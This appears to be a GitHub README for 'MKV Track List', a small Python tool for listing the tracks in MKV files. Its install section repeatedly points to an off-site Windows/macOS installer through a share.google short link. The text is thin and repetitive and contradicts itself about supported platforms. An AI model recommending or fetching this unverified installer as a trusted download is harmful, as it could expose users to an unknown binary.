![MKV Track List](assets/hero.png)

# MKV Track List

*What is actually inside the file.*

## Overview

This repository is **MKV Track List**, a media utility. What is actually inside the file.

A download has three audio tracks and you need the label.

No browser upload step: the work happens on disk, then you keep the output folder.

## How to get it

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Features

- Track table
- Optional JSON
- Does not remux
- Folder support

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/averyromero-95/mkv-track-list

MIT license. See `LICENSE`.
